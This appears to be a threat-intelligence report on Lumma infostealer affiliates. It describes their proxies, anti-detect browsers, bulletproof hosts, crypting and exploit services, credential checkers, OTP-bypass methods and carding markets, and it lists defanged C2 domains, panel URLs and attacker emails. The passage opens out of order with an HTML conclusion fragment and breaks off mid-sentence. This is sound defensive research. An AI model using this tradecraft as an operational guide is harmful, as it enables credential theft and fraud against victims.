enforcement disruption. Looking ahead, Lumma affiliates will likely further diversify their presence across specialized and niche forums, integrating more deeply with cryptocurrency-focused platforms and encrypted messaging ecosystems, complicating detection and disruption efforts.</p>\n        <p>While many tactics and tools appear standardized across affiliates, who are likely influenced by shared guides provided by the Lumma MaaS operators, meaningful operational differences exist. These nuances are crucial for defenders, as understanding individual affiliate behaviors offers a clearer picture of how specific threats emerge and evolve within a broader ecosystem. In addition, the findings underscore that many Lumma affiliates are not casual participants, but embedded actors with deep ties to the cybercriminal underground. Their adoption of layered tool sets and diversification across malware families suggests both maturity and adaptability.</p>\n        <p>Looking ahead, although recent law enforcement efforts temporarily disrupted Lumma’s infrastructure, the group’s swift recovery with minimal changes underscores its resilience and operational discipline. The longer-term impact of the law enforcement efforts on the individual affiliates hinges on Lumma’s ability to rebuild trust and retain them, a goal it pursues through swift restoration of its infrastructure, <a href=\"https://www.trendmicro.com/en_us/research/25/g/lumma-stealer-returns.html\">proactive communication</a>, and likely feature enhancements. More broadly, the recent law enforcement operations underscore how modern cybercriminal operations function as decentralized networks, where even successful disruptions tend to have only short-term effects. Sustained mitigation will require ongoing law enforcement pressure and targeted intelligence to track the evolving tactics of individual affiliates, in addition to seeking to disrupt Lumma’s infrastructure.</p>\n        <h2>Appendix A — Ngioweb Botnet-Linked IP Addresses Used by Lumma Affiliate blackowl23</h2>\n        <div>\n          <div>\n            <div><strong>IP

Group delivers a first-of-its-kind analysis of multiple Lumma affiliates operating within a vast, interconnected information-stealing ecosystem. The Lumma infostealer has been around since 2022, and its ecosystem is supported by a broad array of operational enablers, including proxy networks, virtual private networks (VPNs), anti-detect browsers tailored for multi-account management, exploit and crypting services, and detection evasion tools designed to ensure stealth and continuity. The investigation revealed previously undocumented tools and demonstrated that Lumma affiliates frequently operate multiple schemes simultaneously. For instance, one affiliate was identified operating rental scams, while others simultaneously leveraged multiple malware-as-a-service (MaaS) platforms, including Vidar, Stealc, and Meduza Stealer, likely to bolster operational agility, improve success rates, and mitigate the risks linked to detection and law enforcement takedowns. In addition, several Lumma affiliates are tied to distinct threat actor personas across underground forums, reinforcing their deep integration within the broader cybercriminal ecosystem.\nIn the short term, defenders should adhere to security best practices by monitoring for exfiltration events, deploying detections such as YARA, Sigma, and Snort rules to uncover both current and historical infections, restricting downloads from websites, and potentially using allow-lists. Organizations should train employees to recognize signs of illegitimate downloads, redirects associated with malvertising, and increasingly common techniques like ClickFix attacks. Additionally, defenders should monitor dark web and underground forums for leaked credentials and malware logs. In the long term, defenders must continuously observe the cybercriminal ecosystem to anticipate emerging threats and adapt security policies and practices accordingly.\nLooking ahead, Insikt Group anticipates that the MaaS Lumma and its affiliate network will remain active, having long been a frontrunner in the cybercriminal ecosystem due to its technical sophistication, rapid adoption of new techniques, and demonstrated resilience, as evidenced by its ability to reestablish infrastructure within days of a major law enforcement takedown. While the long-term impact of such operations on Lumma’s MaaS affiliate network remains uncertain, there has been no indication of affiliates abandoning the platform or of viable alternatives emerging. Ultimately, Lumma and its affiliates exemplify how modern cybercriminal operations operate as decentralized networks, where even effective disruptions often yield only short-term setbacks. Achieving sustained mitigation will require persistent law enforcement pressure and focused intelligence efforts to monitor and counter the evolving tactics of individual affiliates.\nKey Findings\nInsikt Group uncovered previously unreported tools used by Lumma affiliates, including a cracked email credential validation tool circulated on underground forums and a phishing page generator tied to another actor active across multiple forums.\nLumma affiliates were observed running multiple scams in parallel, some enabled by their use of Lumma, such as using stolen logs for rental fraud. In addition, several affiliates appeared to use multiple infostealers simultaneously, including Vidar, Stealc, and Meduza Stealer, to maximize success rates and mitigate disruptions from detection or law enforcement action.\nLumma affiliates heavily rely on underground and specialized carding forums as essential operational hubs. They leverage these platforms to recruit collaborators, obtain critical resources such as crypting services and privacy-enhancing services, and efficiently monetize stolen credentials, financial data, and infostealer logs through built-in black markets, fraud tools, and community-backed support networks.\nBackground\nLumma, sometimes referred to as LummaC2, was the most widespread infostealer in 2024 based on Recorded Future’s malicious infrastructure analysis, and despite facing law enforcement actions in May 2025, it continues to pose a significant threat, actively exfiltrating data from individuals, organizations, and governments. While infostealers like Lumma are now a well-known menace in the cybersecurity landscape, many questions remain: What does a typical day look like for an infostealer affiliate? How do they operate, who are they, what other activities are they involved in, where are they based, and how are the stolen logs ultimately used?\nOver the past twelve months (the second half of 2024 through the first half of 2025), Insikt Group has conducted a comprehensive investigation into a broad network of Lumma affiliates operating across multiple countries. Drawing on a wide range of intelligence sources, including two affiliate guidance manuals (see Figure 1), Recorded Future Malware Intelligence, Recorded Future Identity Intelligence malware logs, and other proprietary investigative methods, Insikt Group has uncovered detailed, unique insights into these affiliates' operations and tradecraft.\nFigure 1: Lumma manuals from 2023 (top) and 2024 (bottom) (Source: Recorded Future)\nThe findings are presented in two sections: The first examines the affiliates’ technical ecosystems, detailing their use of info-stealing techniques, favored tools and services, and recurring operational behaviors. The second explores how Lumma affiliates are embedded in the broader underground economy. It analyzes their participation in cybercrime forums, use of additional infostealer malware families, and involvement in other types of online fraud and scams.\nThreat Analysis\nOperational Infrastructure and Tradecraft\nPrivacy Enhancing Services\nProxy Services\nInsikt Group observed multiple Lumma affiliates leveraging various proxy services, detailed in Table 1; Pia Proxy was the most frequently used service. Proxies can be used for legitimate purposes such as privacy and research, but they are frequently exploited by cybercriminals to mask identities, avoid detection, and bypass restrictions. Some services, such as ASocks and the malware-based FACELESS, among others, have been openly marketed on cybercrime forums; ASocks has been linked to fake VPNs that convert Android devices into proxies, while FACELESS leverages malware to hijack IoT devices for the same purpose. Insikt Group evaluated the proxy services by type based on several criteria, including whether they were promoted on cybercriminal forums.\nDomains\nName\nType\nPrevalence Across Affiliates\npiaproxy[.]com\nPIA Proxy\nCybercriminal\nHigh\nghostsocks[.]net\nGhostSocks\nCybercriminal\nHigh\nasocks[.]com\nASocks\nCybercriminal\nMedium\nfaceless[.]cc\nFACELESS\nCybercriminal\nMedium\nhotsocks[.]biz\nHotSocks\nCybercriminal\nMedium\nhotsocks[.]ws\nHotSocks\nCybercriminal\nMedium\nnsocks[.]net\nNSOCKS\nCybercriminal\nMedium\nproxyline[.]net\nProxy Line\nCybercriminal\nMedium\nvn5socks[.]net\nVN5Socks\nCybercriminal\nMedium\ngridpanel[.]net\nGridPanel\nLikely cybercriminal\nLow\n3389rdp[.]com\nRDP Shop\nUnclear\nN/A\n922proxy[.]com\n922 Proxy\nLikely cybercriminal and possibly a rebrand of 911 Proxy\nN/A\nsmartproxy[.]pxf[.]io\nSmartproxy\nUnclear\nN/A\nswiftproxy[.]io\nSwift Proxy\nUnclear\nN/A\nTable 1: Proxy services used by Lumma affiliates (Source: Recorded Future)\nOf note, in early 2024, Lumma began collaborating with the GhostSocks team, a residential proxy plugin, enabling affiliates to create SOCKS5 proxies from infected bots, as announced via Lumma’s official channel (see Figure 2) (1, 2). By 2025, Lumma expanded this offering, providing affiliates with backconnect proxy access to compromised machines. This allowed threat actors to conduct attacks that appeared to originate from the victim’s device, significantly improving their ability to bypass access controls such as Google’s cookie-based protections, a mechanism Lumma routinely exploits to refresh expired tokens.\nFigure 2: Announcement of GhostSocks-Lumma partnership (Source: X)\nIn at least one instance, Insikt Group identified a Lumma affiliate linked to build ID vcs1q5 — and known as “blackowl23” on cybercriminal forums such as Cracked, Nulled, Sinisterly, Eternia, and Cracking during 2022 and 2023 — using IP addresses associated with the Ngioweb botnet. This botnet has been previously linked to the cybercriminal proxy service NSOCKS, as well as others such as VN5Socks and Shopsocks5. The associated IP addresses, likely no longer part of the botnet due to public reporting and other mitigating actions, are listed in Appendix A. Many of the IP addresses had been previously validated by Insikt Group and reported on publicly.\nVPN Services\nAccording to research conducted by Insikt Group, all analyzed Lumma affiliates were using VPN services in some capacity, with many using multiple providers. A selection of the VPN services observed in use by these affiliates is presented in Table 2.\nDomain\nService Name\nPrevalence Across Affiliates\nexpressvpn[.]com\nExpressVPN\nMedium\nnordvpn[.]com\nNordVPN\nMedium\nprotonvpn[.]com\nProton VPN\nMedium\nsurfshark[.]com\nSurfshark VPN\nMedium\ntunnelbear[.]com\nTunnelBear\nMedium\nTable 2: VPN services used by Lumma affiliates over the past year (Source: Recorded Future)\nAnti-Detection and Multi-Account Browsers\nLumma affiliates frequently rely on specialized privacy-focused and anti-detect browsers (see Table 3) to evade identification, bypass security measures, and manage multiple fraudulent accounts simultaneously. These tools allow the threat actors to maintain operational security (OPSEC) by obscuring their true identity, location, and digital fingerprints. Among the most prevalent browsers used by Lumma affiliates is Dolphin, recognized widely as one of the best anti-detect browsers tailored explicitly for managing multiple threat actor-controlled accounts without detection. Dolphin’s capabilities are mirrored by Adspower, Hidemyacc, and Kameleo, which similarly facilitate seamless multi-account operations, thereby enhancing operational efficiency and anonymity. Octo Browser, another prominent tool among cybercriminals, provides advanced fingerprint masking, further complicating efforts by law enforcement and threat intelligence professionals to track threat activities to their source.\nThe Brave browser, while designed primarily for enhanced user privacy rather than outright anti-detection, appeals to threat actors due to its robust built-in security and privacy features, such as aggressive ad and tracker blocking. Although less explicitly tailored for multi-account management, its privacy-focused approach provides valuable baseline protection for threat actors seeking to maintain anonymity online.\nBrowser\nDomain\nPrevalence Across Affiliates\nDolphin\ndolphin-anty[.]com\nHigh\nOcto Browser\noctobrowser[.]net\nHigh\nBrave\nbrave[.]com\nMedium\nAdspower\nadspower[.]com\nLow\nHidemyacc\nhidemyacc[.]com\nLow\nKameleo\nkameleo[.]io\nLow\nTable 3: Anti-detect browsers for multi-account management used by Lumma affiliates (Source: Recorded Future)\nHosting Providers\nWhile Lumma supplies core C2 infrastructure through its MaaS offering, its affiliates rely on separate hosting providers likely aimed at supporting phishing efforts, payload deployment, and other malicious activity. Many of the hosting providers linked to the analyzed Lumma affiliates appear legitimate, but some stood out for seemingly catering directly to cybercriminals and enabling malicious activity, including AnonRDP, Bulletproof Hosting, and Hostcay, which have been used by the Lumma affiliate linked to the build ID re0gvc.\nAnonRDP\nAnonRDP (anonrdp[.]com) is a self-proclaimed bulletproof hosting provider specializing in anonymous VPS and RDP services, with a strong focus on privacy and resistance to takedown (see Figure 3). It requires no identity verification and accepts only cryptocurrency payments, such as Bitcoin and Monero, processed through the payment service provider NOWPayments and, allegedly, the cryptocurrency exchange ChangeNOW. Its tolerance of malicious activity is further confirmed by advertisements on deep web forums such as BreachForums, Hack Forums, Nulled, and Patched. As illustrated in Figure 3, the website explicitly acknowledges supporting activities such as hosting, distributing, or controlling botnets, remote access trojans (RATs), phishing, fraudulent content, spam, and more. According to public reports, AnonRDP is operated by Yashvir Keshave, an individual with a known history of involvement in the underground ecosystem, including config (configuration) creation, cracking tools, and digital account trading.\nFigure 3: AnonRDP website (Source: urlscan.io)\nFollowing the arrest of Yuri Meruzhanovich Bozoyan, co-founder and CEO of Aeza Group LLC, on April 1, 2025, Insikt Group observed that AnonRDP had attempted to poach Aeza customers with 50% discounts. The extent of the poaching’s success remains uncertain.\nBulletproof Hosting\nSimilarly, Bulletproof Hosting (bulletproofhosting[.]org) markets itself as an offshore, privacy-centric hosting provider that offers anonymous, takedown-resistant infrastructure, accepts cryptocurrency payments, and has no ID requirements (see Figure 4). The website promotes lenient content policies, explicitly permitting adult material, piracy, gambling, and other content typically banned by conventional hosts. It claims to defend against DMCA notices, abuse complaints, and Spamhaus listings, using techniques like FastFlux and hosting in offshore or hardened facilities with minimal regulatory oversight. With 24/7 support managed by self-described “cyber-tech experts,” the platform is positioned as a resilient service catering to users seeking both anonymity and consistent uptime, which are often appealing to threat actors and controversial content operators.\nFigure 4: Bulletproof Hosting website (Source: urlscan.io)\nHostCay\nHostCay (hostcay[.]com) is a privacy-focused, offshore hosting provider founded in 2023 and operated by Netacel Inc., an international business company (IBC) registered in Seychelles. HostCay specializes in hosting services that prioritize freedom of speech, whistleblower support, and resistance to content takedown requests (see Figure 5). It is known for its support for anonymous crypto payments, no ID requirements, and strong free speech protections.\nFigure 5: HostCay website (Source: urlscan.io)\nLumma affiliates have also been observed leveraging numerous legitimate hosting providers and services, including the file hosting platform MEGA (mega[.]nz), the file and text sharing service Temp[.]sh (temp[.]sh), and the image hosting service ImgBB (imgbb[.]com). They have also made use of various URL shortening services such as shorturl[.]at and free-url-shortener[.]rb[.]gy.\nExploit and Crypting Services\nOne notable service supporting Lumma operations is run by an actor known as “@cryptexxx.” Rather than being a Lumma affiliate directly, @cryptexxx is the operator of a crypting and exploit service known as Hector (advertised via the domain hector[.]su) that caters to malware distributors, among others (see Figure 6). The HTML content of hector[.]su includes meta keywords — such as crypt, exe, exploits, chrome, bypass, lnk, url, xls, xll, doc, docx, pdf, builder, macro, or popup — indicating a broad toolkit for creating malicious payloads across various file formats (from Office macros to Chrome exploits). Forum discussions corroborate that this service provides fully undetectable (FUD) droppers and document exploits for delivering malware. For example, one hacker forum user explicitly directs others to “see URL exploit on hector[.]su” as a resource for a Gmail-attachable, FUD exploit. Such exploits often take the form of weaponized Office files, like malicious Excel add-in files (.XLL) or macro-laced documents, which can embed the Lumma payload and are designed to slip past email scanners and antivirus protections.\nRecent evidence illustrates how these tools are used in practice. In mid-2025, an underground vendor advertised an updated Office exploit that is “up to date, works in 2025 and attachable on Gmail, plus FUD,” explicitly boasting that it can bypass Gmail’s filters. The same offering also highlights a Windows Defender runtime bypass, with an AV scan report showing 0/26 detections. This means a Lumma affiliate could generate a trojanized file (such as an Excel .xll file or a malicious shortcut/URL file) that delivers the stealer while evading both email gateway scanning and endpoint antivirus protections.\nBy leveraging @cryptexxx’s crypting service and exploit builder, the affiliate essentially outsources the difficult aspects of stealth and delivery. It is a clear example of the cooperative nature of LummaC2 operations: the malware developer provides the infostealer malware, the service operator (@cryptexxx) supplies an obfuscation and exploit toolkit, and the affiliate uses these tools to distribute the payload to victims.\nFigure 6: Hector website (Source: urlscan.io)\nEmail-Linked Services and Tools\nInsikt Group observed multiple Lumma affiliates using a range of email and spam-related services, including a credential validation tool known as “EMAIL SOFTWARE 1.4.0.9 cracked by Maksim” and a phishing page creation tool known as “DONUSSEF”, both of which have likely been deployed in at least one confirmed case.\nEMAIL SOFTWARE 1.4.0.9 cracked by Maksim\nEMAIL SOFTWARE 1.4.0.9 cracked by Maksim is a cracked version of a Windows .NET-based email credential verification tool (see Figure 7). It is designed to validate email and password combinations against mail servers using protocols like IMAP and POP3. Users can input large lists of email credentials (often referred to as \"combo lists\") to check which combinations are valid. The tool also allows users to search for specific keywords within email content. The tool is distributed as a password-protected .rar archive on various hacking and cracking forums (such as DemonForums or XReactor), with users reporting prices of up to $250 on underground marketplaces.\nFigure 7: EMAIL SOFTWARE 1.4.0.9 cracked by Maksim advertised on forum[.]cnsec[.]org (Source: urlscan.io)\nThe tool features a user interface with several configuration options, including a status overview of processed email addresses, a control panel to start or stop validation, and proxy management capabilities, among other functionalities (see Figure 8).\nFigure 8: Graphical user interface (GUI) of EMAIL SOFTWARE 1.4.0.9 cracked by Maksim\n(Source: Recorded Future)\nInsikt Group assesses that the Lumma affiliate blackowl23 has used or continues to use the tool to validate stolen credentials, which are then leveraged in the follow-on real estate scam detailed in the section blackowl23’s Involvement in Real Estate Scam, among other scams. Based on identified configurations, it is possible that the affiliate has customized the tool.\nDONUSSEF\nInsikt Group identified another tool, known as “DONUSSEF”, which was demonstrated in a publicly accessible video hosted on Google Drive at the time of analysis (see Figure 9). Believed to be used by blackowl23, the tool is designed to generate phishing pages via the command line using AI. It prompts the user to input URLs, a subject line, and a brief description of the intended phishing content, and then produces an HTML file as output.\nFigure 9: Demo video of DONUSSEF (Source: Recorded Future)\nThe full range of phishing pages the tool can generate remains unclear, as Insikt Group was unable to independently test it. In the demo, it was shown creating only PayPal phishing pages (see Figure 10). Due to the unavailability of the actual HTML pages, Insikt Group was unable to assess their effectiveness or determine whether they have appeared in any known campaigns.\nFigure 10: PayPal phishing page generated by DONUSSEF (Source: Recorded Future)\nThrough further investigation, Insikt Group identified a YouTube channel likely associated with the suspected creator of DONUSSEF. The actor used the channel to demonstrate at least two additional tools: one marketed as an email sender with a 100% inbox delivery rate, and another for SMS spamming (referred to as “ULTRA-checker.py” in the video). Both videos were uploaded on December 18, 2022, from a device using French-language settings. In one of the demo videos, the actor used and accessed two email accounts, ussefescobar@seznam[.]cz and ussefakkar@outlook[.]com, which are believed to be linked to the actor.\nThe ULTRA-checker.py tool includes references to two Telegram channels: @donussef and @rdpvendor. At least one of these accounts appears to be active in Telegram communities associated with spam-related tools (see Figure 11). Insikt Group found no additional links between the suspected creator of DONUSSEF and blackowl23.\nFigure 11: @donussef advertising tooling on Telegram (Source: Recorded Future)\nOther Email Sender and Lead Generation Services\nInsikt Group identified several other, often legitimate email-related services used by Lumma affiliates for multiple purposes, including Joz Data (jozdata[.]com), Mailchimp (mailchimp[.]com), Spamir (spamir[.]fr), and Mandrill (mandrillapp[.]com), among others. Joz Data provides validated, segmented email lists for marketing and lead generation. Mailchimp is a legitimate platform for designing and managing email campaigns. Spamir offers tools for bulk email and SMS delivery, often linked to spam or phishing activity despite being presented as a testing toolkit. Mandrill, a paid add-on to Mailchimp, is a transactional email API used to send one-to-one, event-triggered messages such as password resets and order confirmations via SMTP or API.\nAVCheck and Alternatives\nLike many threat actors deploying malware or related infrastructure, Lumma affiliates actively seek tools to test detection beyond standard sandbox environments. Over the past twelve months, Insikt Group observed multiple affiliates using at least two such services: AVCheck (avcheck[.]net), which was seized by law enforcement in May 2025; and, more recently, KleenScan (kleenscan[.]com). There were also signs that at least one affiliate used avscan[.]net, although its presence and nature could not be confirmed at the time of analysis, as the domain appeared to be listed for sale.\nKleenScan is an alternative malware-scanning service frequently used by and marketed to cybercriminals to test malicious files, URLs, and domains against multiple antivirus engines (see Figure 12). It offers a user interface, API, and command-line client, and even a Telegram bot (@kleenscanofficialbot) for uploads and real-time or runtime scans, all while explicitly promising a \"No Distribution\" policy so that submitted samples will not be shared with antivirus vendors. Although Insikt Group observed Lumma affiliates using KleenScan prior to AVCheck’s seizure in May 2025, public reporting indicates that cybercriminals have increasingly turned to platforms like KleenScan as an alternative due to the seizure. Notably, KleenScan advertises hector[.]su (see Figure 12), an exploit broker further detailed in the section Exploit and Crypting Services.\nFigure 12: KleenScan website (Source: urlscan.io)\nPhone and SMS Services\nLumma affiliates heavily abuse virtual phone and SMS services (see Table 4) such as OnlineSim, SMS-Activate, and Zadarma. These platforms provide throwaway phone numbers for SMS or voice verification, which the threat actors use to bypass OTP-based security and create fake accounts without using personal identifiers. Lumma affiliates can automatically receive 2FA codes or activation PINs on virtual numbers, allowing them to register malware distribution sites, cloud drives, or messaging accounts without exposing their real phone lines. This identity obfuscation is crucial in the Lumma ecosystem, as it frustrates attribution and takedown efforts by making infrastructure ownership seem transient.\nIn practice, using these services for OTP bypass and fake account generation helps Lumma crews widen their attack surface. Disposable SMS numbers let attackers circumvent SMS-based two-factor authentication by redirecting one-time passcodes to attacker-controlled inboxes. This means that even if a stolen account is protected by SMS 2FA, Lumma affiliates can try to reroute the OTP to a virtual number they control, effectively nullifying the protection. Services like Zadarma (a VoIP provider) further enable criminals to receive calls or texts on virtual lines, or even perform spoofed voice calls as part of OTP interception bots and vishing schemes. Within the Lumma affiliate program, guides and community chatter encourage the use of these tools for operational security, from registering throwaway email and Telegram accounts to setting up C2 panels or scam payment accounts.\nService Name\nDomain\nNotes\nOnlineSim\nonlinesim[.]io\nBurner eSim Provider\nSMS-Activate\nsms-activate[.]org\nBurner eSim Provider\nSMS-Activate\nsms-activate[.]io\nBurner eSim Provider\nZadarma\nzadarma[.]com\nVoIP Service\nTable 4: Phone and SMS-linked services used by Lumma affiliates (Source: Recorded Future)\nMessaging Platforms\nLumma affiliates integrate multiple secure messaging and information-sharing tools into their daily workflows to enhance operational security, maintain anonymity, and minimize digital footprints. Affiliates commonly use uTox, a decentralized peer-to-peer messaging client employing end-to-end encryption via the Tox protocol. This tool facilitates persistent, secure communications, supporting text, voice, and video messaging, and is frequently combined with Tor proxies to conceal affiliate identities and avoid central server dependencies.\nMobile affiliates within the Lumma ecosystem prefer secure XMPP-based Android applications like Xabber and c0nnect[.]pro. Both apps offer encrypted communications via off-the-record encryption, multi-account management, and compatibility with private, controlled XMPP servers, making them ideal for discrete coordination while on the move. Affiliates often configure these applications to run in tandem with Tor proxies, further obfuscating metadata and reducing digital exposure.\nFor scenarios requiring transmission of ephemeral, sensitive information, such as credentials, passwords, or instructions, Lumma affiliates frequently rely on Privnote, a web-based service that generates encrypted notes that self-destruct after being read once. This capability significantly reduces the affiliate’s potential forensic footprint by leaving no persistent records and enables secure, rapid exchanges of operational details.\nCollectively, these tools form a layered communication architecture employed by Lumma affiliates, effectively balancing persistent communications, mobile flexibility, and ephemeral secure exchanges to minimize risks and enhance stealth.\nSocial Media Optimization\nIn at least one case, Insikt Group observed a Lumma affiliate leveraging the service Bosslike (bosslike[.]ru), which claims to offer free and rapid boosts for likes on platforms such as Instagram, VK, and TikTok (see Figure 13), likely in support of scam-related activities.\nFigure 13: Bosslike website (Source: urlscan.io)\nAffiliates’ Embedding in the Cybercriminal Ecosystem\nForum Involvement\nLumma’s affiliate ecosystem thrives on underground forums that act as hubs for collaboration, resources, and marketplaces. Russian-language cybercrime forums like XSS and Exploit serve as launchpads for Lumma’s MaaS, and they are where the stealer was initially advertised and vetted by the community. These forums attract technically adept threat actors and lend credibility to new malware offerings through reputation systems and moderator oversight. Affiliates frequent them not only to obtain Lumma builds but also to engage with trusted escrow and arbitration services, ensuring safer transactions when purchasing tools or settling disputes with partners. The established trust on forums like Exploit and XSS provides a reliable environment for affiliates to do business, from renting servers to resolving conflicts, under the watch of experienced moderators.\nFigure 14: LummaC2 administrator (image text machine-translated from Russian) (Source: Exploit Forum)\nAt the same time, mass-market cybercrime communities such as LolzTeam (zelenka[.]guru) have become a hotbed for recruiting and training the foot soldiers of Lumma’s operations. These more accessible forums host dedicated sections for “traffers,” threat actors who specialize in spreading infostealer malware, and are actively used to assemble affiliate teams and educate newcomers. On LolzTeam, for example, seasoned criminals advertise infostealer affiliate programs that provide novices with everything needed to start distributing malware. In one case, a team on LolzTeam offered free crypted Lumma builds and even SEO support to new recruits, taking a percentage of profits from stolen cryptocurrency assets. This low barrier to entry, combined with forum-posted tutorials on fraud techniques and operational security, turns platforms like LolzTeam into a workforce pool for infostealer distribution. The forums’ community-driven vetting, including rules against targeting certain regions and public feedback on schemes, further helps affiliates learn effective and “acceptable” tactics. Common fraud methodologies are frequently discussed and popularized on these boards, giving Lumma affiliates insight into monetization tricks and victim manipulation strategies.\nPerhaps most critically, these underground forums provide ready-made marketplaces and services that Lumma affiliates leverage to monetize stolen data and optimize their campaigns. Infostealer logs are in high demand, and forums link affiliates to bustling marketplaces where this data is bought and sold. Russian Market (rm1[.]to), for example, is an automated shop accessible via forum circles that has been described as “the Amazon of stolen credentials” for its massive inventory and one-click purchase convenience. By late 2024, Lumma had become the dominant source of credentials on Russian Market, accounting for roughly 92% of stolen log listings, underscoring how extensively Lumma affiliates dump their haul on such platforms for profit. Other venues like LolzTeam’s own marketplace and xleet[.]pw similarly include sections for infostealer logs, compromised accounts, and digital goods, allowing affiliates to quickly sell data from Lumma infections to the highest bidder. Beyond data sales, forum marketplaces connect Lumma affiliates to initial access brokers and financial fraud services that help convert stolen information into cash. Affiliates can find buyers for enterprise login credentials or enlist money laundering and cash-out services advertised across these forums.\nUnderground forums double as one-stop shops for the technical and operational support that Lumma affiliates need. Dedicated threads run by the Lumma developers or peer community members offer technical assistance, update announcements, and troubleshooting advice in real time. This means an affiliate can turn to forum communities for help with builder configuration, antivirus evasion tips, or to share intelligence on law enforcement takedowns. The forums also host a range of malware-adjacent services crucial to running stealthy campaigns. Providers of bulletproof hosting, VPNs, and traffic distribution congregate on all major forums. The same service providers frequently advertise on multiple sites, which makes it easy for affiliates to obtain resilient servers and web domains to host Lumma malware. Crypting services are equally accessible; for instance, the popular Cassandra crypter and others are promoted in forum marketplaces, enabling affiliates to continuously encrypt and repackage Lumma payloads to evade antivirus detection.\nThere is a rich ecosystem of offerings, such as exploit kits, fake document templates, spambot rentals, and credential checkers, which affiliates can source from these communities to enhance their operations. Together, these forums provide Lumma affiliates with a comprehensive suite of tools that have been vetted by the community. This practical and operational value is why Lumma’s affiliate network remains deeply embedded in underground forums: they provide not only the means to deploy and hide the malware, but also the mechanisms to cash in on its outputs, all within a semi-structured community that enforces trust among thieves.\nCarding Shops\nLumma Stealer affiliates turn to specialized carding shops like b1ackstash[.]cc, stashpatrick[.]io, BriansClub (see Figure 15) (bclub[.]cm and briansclub[.]cm), and binsoficial666[.]activo[.]mx to efficiently monetize the financial data they’ve stolen. Insikt Group notes that these sources vary widely in credibility; shops like BriansClub are considered authoritative within the payment fraud ecosystem, while binsoficial666[.]activo[.]mx has a very poor reputation. Unlike general cybercrime boards, carding websites are dedicated to trading payment data and attract a built-in customer base of fraudsters looking for credit card numbers, bank logins, and personal info. Lumma affiliates capitalize on this demand by selling freshly obtained card records and “fullz” in bulk, often earning a percentage for each sale through the forum’s escrow or shop system. In essence, carding platforms let Lumma affiliates quickly turn stolen card data into profit, with high-volume outlets like BriansClub historically trafficking millions of compromised cards supplied by malware affiliates.\nFigure 15: Landing page for BriansClub (Source: BriansClub)\nBeyond sales, carding forums offer operational support for fraud that broader hacking forums do not. Lumma affiliates frequent these communities to learn and collaborate on card-not-present (CNP) fraud using stolen card credentials to buy goods or launder money online. The forums host vetted tutorials for abusing e-commerce sites and payment processors, helping thieves bypass anti-fraud measures. Members also advertise criminal services such as providing “drop” addresses (safe delivery points for goods bought with stolen cards) or converting illicit purchases into cash. Additionally, these forums supply validation tools and services critical to fraud operations. Lumma affiliates can purchase or access credit card checkers that automatically test which cards from their stealer logs remain valid and have credit available, ensuring they only spend time on live cards. They might also acquire Bank Identification Number (BIN) lists and other utilities, using the community’s pooled resources to maximize successful transactions. Carding sites enable Lumma affiliates to offload infostealer loot in bulk, complementing sales on broader crime forums. A single Lumma infection yields an expansive log of credentials, cookies, system data, and often multiple financial accounts; parsing and individually selling each asset can be labor-intensive. Carding marketplaces or associated breach data shops let affiliates resell entire stealer logs or specific datasets to other criminals who specialize in exploiting them. For example, high-value logs from Lumma, containing not just cards but bank account passwords or cryptocurrency wallet keys, are often posted on underground markets or offered via automated bot vendors shortly after exfiltration. This practice allows Lumma affiliates to monetize stolen information at scale: they can quickly sell bundles of fresh logs to brokers or fraud rings while focusing their own efforts on new infections. In tandem with general hacking forums, these carding forums provide the ecosystem for cashing out Lumma’s results. They offer a one-stop underground economy where affiliates convert stolen data into money through direct sales of CVVs and “fullz,” the provision of guidance and tools for fraudulent transactions, and the bulk resale of stolen logs. This significantly enhances both the profitability and practicality of Lumma operations.\nUse of Additional Infostealers\nInsikt Group observed several Lumma affiliates leveraging other infostealers alongside Lumma.\nMeduza Stealer, Vidar, and CraxsRAT Used by Likely Mexico-Based Lumma Affiliate\nThe affiliate linked to Lumma build ID re0gvc, a likely Mexico-based threat actor operating under multiple aliases across various forums, was observed using Meduza Stealer infrastructure tied to IP address 195[.]133[.]18[.]15. Like Lumma, Meduza Stealer is a Windows-based MaaS infostealer, designed to extract credentials, browser data, and crypto wallets while evading detection through anti-analysis and geo-filtering techniques.\nFigure 16: Meduza Stealer panel on hxxp://195[.]133[.]18[.]15/auth/login (Source: urlscan.io)\nInsikt Group also identified high-confidence indicators that the same threat actor used Vidar, a Windows-based infostealer, along with medium-confidence evidence suggesting the use of CraxsRAT, an Android-based RAT, based on Telegram profile images likely tied to the affiliate (see Figure 17). While this indicates this affiliate may have also targeted mobile devices, Insikt Group found no associated samples, infrastructure, or campaigns to confirm this activity.\nFigure 17: Telegram account linked to Kingping_Mx (Source: Recorded Future)\nStealc Used by Lumma Affiliate suffergrime\nAnother affiliate linked to Lumma build IDs test222 and eLMNFu, known as “suffergrime” on various forums and operating under multiple other aliases, including duckfuck, cryptplease, ultracool2201, borodach, and dedo4ek, appears to have used StealC alongside Lumma. Stealc is a modular, evasive information stealer written in C and distributed as an MaaS. More specifically, suffergrime has been observed interacting with the Stealc management panel on the URL hxxp://94[.]232[.]249[.]208/6a6fe9d70500fe64/main.php. Insikt Group assesses that the affiliate is likely a Spanish speaker, with indications suggesting a possible origin in South America.\nworldmix10k’s Interest in Wallet and Vilsa Stealer\nIn addition to the cases above, Insikt Group observed a Lumma affiliate associated with build ID 1dacrp and likely known as “worldmix10k” expressing interest in two additional stealers: a “Wallet Stealer” previously hosted on a GitHub repository named “poopybuthoop”, and Vilsa Stealer, an infostealer that had been publicly reported on earlier. Although the GitHub repository was no longer accessible at the time of analysis, a historical snapshot was preserved by Ecosyste.\nFigure 18: Repository linked to poopybuthoop (Source: Ecosyste)\nNotably, a search for the string “worldmix10k” led Insikt Group to a Lumma sample with the build ID “1dacRP--worldmix10k”, linked to the same affiliate. This sample used techmindzs[.]live and earthsymphzony[.]today as its C2 domains, as well as a SteamCommunity URL, hxxps://steamcommunity[.]com/profiles/76561199822375128, for dead drop resolving. Insikt Group could not identify the exact infection chains linked to the sample.\nInvolvement in Other Scams\nAnalysis of multiple Lumma affiliates over the last twelve months revealed that many are not only using multiple infostealers concurrently, as outlined in the section Use of Additional Infostealers, but are also likely involved in a variety of distinct scam operations. One of these scams, linked to the Lumma affiliate known as blackowl23, drew particular attention from Insikt Group and is explored in greater detail below.\nblackowl23’s Involvement in Real Estate Scam\nInsikt Group uncovered evidence indicating that blackowl23 has been involved in a real estate scam in which rental listings, likely both actor-created and compromised, on platforms like the German website WG-Gesucht were used to deceive victims into making payments before apartment viewings. As part of this scheme, blackowl23 has used the email addresses immo-total[@]outlook[.]com and mwimport[@]outlook[.]de (see Figure 19).\nFigure 19: WG-Gesucht advertisements showing up in a Google search (Source: Recorded Future)\nMore specifically, the affiliate claimed to have had “bad 